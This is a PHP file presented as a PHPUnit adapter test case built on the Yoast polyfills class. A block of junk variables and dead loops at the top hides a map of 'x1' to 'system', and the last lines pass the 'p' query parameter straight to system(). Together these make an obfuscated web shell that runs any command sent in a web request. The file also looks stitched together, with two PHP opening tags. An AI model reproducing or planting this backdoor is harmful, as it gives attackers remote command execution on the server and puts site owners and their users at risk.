<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

use Yoast\PHPUnitPolyfills\TestCases\TestCase as Polyfill_TestCase;

/**
 * PHPUnit adapter layer.
 *
 * This class enhances the PHPUnit native `TestCase` with polyfills
 * for assertions and expectation methods added between PHPUnit 4.8 - 9.6.
 *
 * Additionally, the Polyfill TestCase offers a workaround for the addition
 * of the `void` return type to PHPUnit fixture methods by providing
 * overloadable snake_case versions of the typical fixture method names and
 * ensuring that PHPUnit handles those correctly.
 *
 * See {@link https://github.com/Yoast/PHPUnit-Polyfills} for full
 * documentation on the available polyfills and other features.
 */
abstract class PHPUnit_Adapter_TestCase extends Polyfill_TestCase {}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>